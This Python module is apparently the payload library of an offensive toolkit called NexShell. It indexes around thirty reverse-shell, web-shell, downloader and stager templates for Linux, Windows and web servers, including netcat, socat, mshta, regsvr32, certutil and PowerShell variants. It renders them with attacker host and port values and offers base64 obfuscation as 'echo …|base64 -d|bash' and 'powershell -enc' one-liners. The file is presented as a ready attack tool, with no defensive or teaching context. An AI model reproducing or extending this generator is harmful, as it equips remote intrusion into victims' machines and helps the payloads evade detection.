#!/usr/bin/env python3
"""
NexShell — Payload Library
Static payload templates stored as files.
All payloads are generated dynamically from templates via PayloadLibrary.
"""

import os
import base64
import hashlib
import platform
from pathlib import Path
from typing import Optional

# ── Payload directory ─────────────────────────────────────────────────────────
PAYLOAD_DIR = Path(__file__).parent


# ══════════════════════════════════════════════════════════════════════════════
#  PAYLOAD LIBRARY  — dynamic template resolver
# ══════════════════════════════════════════════════════════════════════════════

class PayloadLibrary:
    """
    Resolve, render, and manage payload templates.
    Templates use {LHOST} and {LPORT} as placeholders.
    """

    TEMPLATES = {
        # ── Linux / Unix ───────────────────────────────────────────────────
        'bash':           str(PAYLOAD_DIR / 'linux' / 'bash_tcp.sh'),
        'bash_196':       str(PAYLOAD_DIR / 'linux' / 'bash_196.sh'),
        'mkfifo':         str(PAYLOAD_DIR / 'linux' / 'mkfifo.sh'),
        'python3':        str(PAYLOAD_DIR / 'linux' / 'python3_tcp.py'),
        'python2':        str(PAYLOAD_DIR / 'linux' / 'python2_tcp.py'),
        'perl':           str(PAYLOAD_DIR / 'linux' / 'perl_tcp.pl'),
        'ruby':           str(PAYLOAD_DIR / 'linux' / 'ruby_tcp.rb'),
        'php':            str(PAYLOAD_DIR / 'linux' / 'php_tcp.php'),
        'nc_e':           str(PAYLOAD_DIR / 'linux' / 'nc_e.sh'),
        'busybox':        str(PAYLOAD_DIR / 'linux' / 'busybox_nc.sh'),
        'socat':          str(PAYLOAD_DIR / 'linux' / 'socat.sh'),
        'awk':            str(PAYLOAD_DIR / 'linux' / 'awk.sh'),
        'lua':            str(PAYLOAD_DIR / 'linux' / 'lua_tcp.lua'),
        'golang':         str(PAYLOAD_DIR / 'linux' / 'golang.go'),
        'curl_sh':        str(PAYLOAD_DIR / 'linux' / 'curl_sh.sh'),
        # ── Windows ───────────────────────────────────────────────────────
        'powershell':     str(PAYLOAD_DIR / 'windows' / 'powershell_tcp.ps1'),
        'ps_b64':         str(PAYLOAD_DIR / 'windows' / 'powershell_b64.ps1'),
        'mshta':          str(PAYLOAD_DIR / 'windows' / 'mshta_vbs.txt'),
        'wmic':           str(PAYLOAD_DIR / 'windows' / 'wmic_ps.txt'),
        'conptyshell':    str(PAYLOAD_DIR / 'windows' / 'conptyshell.ps1'),
        'regsvr32':       str(PAYLOAD_DIR / 'windows' / 'regsvr32.sct'),
        'certutil':       str(PAYLOAD_DIR / 'windows' / 'certutil_dl.txt'),
        'bitsadmin':      str(PAYLOAD_DIR / 'windows' / 'bitsadmin_dl.txt'),
        # ── Web ────────────────────────────────────────────────────────────
        'php_system':     str(PAYLOAD_DIR / 'web' / 'php_system.php'),
        'php_exec':       str(PAYLOAD_DIR / 'web' / 'php_exec.php'),
        'asp_classic':    str(PAYLOAD_DIR / 'web' / 'classic.asp'),
        'aspx':           str(PAYLOAD_DIR / 'web' / 'webshell.aspx'),
        'jsp':            str(PAYLOAD_DIR / 'web' / 'webshell.jsp'),
        # ── Staged ────────────────────────────────────────────────────────
        'stager_linux':   str(PAYLOAD_DIR / 'staged' / 'stager_linux.sh'),
        'stager_windows': str(PAYLOAD_DIR / 'staged' / 'stager_windows.ps1'),
    }

    @classmethod
    def render(cls, name: str, lhost: str, lport: int,
               obfuscate: bool = False) -> Optional[str]:
        """Read template file, substitute {LHOST}/{LPORT}, return result."""
        path = cls.TEMPLATES.get(name)
        if not path or not os.path.isfile(path):
            return None
        try:
            tmpl = open(path, 'r', encoding='utf-8').read()
            result = tmpl.replace('{LHOST}', lhost).replace('{LPORT}', str(lport))
            if obfuscate and name.startswith('bash'):
                result = f"echo {base64.b64encode(result.encode()).decode()}|base64 -d|bash"
            elif obfuscate and 'powershell' in name:
                enc = base64.b64encode(result.encode('utf-16-le')).decode()
                result = f"powershell -enc {enc}"
            return result
        except Exception:
            return None

    @classmethod
    def list_all(cls) -> dict:
        """Return all available payloads grouped by category."""
        groups = {'linux': [], 'windows': [], 'web': [], 'staged': []}
        for name, path in cls.TEMPLATES.items():
            for cat in groups:
                if f'/{cat}/' in path.replace('\\', '/'):
                    groups[cat].append(name)
                    break
        return groups

    @classmethod
    def checksum(cls, name: str) -> Optional[str]:
        """MD5 of raw template file."""
        path = cls.TEMPLATES.get(name)
        if not path or not os.path.isfile(path):
            return None
        return hashlib.md5(open(path, 'rb').read()).hexdigest()
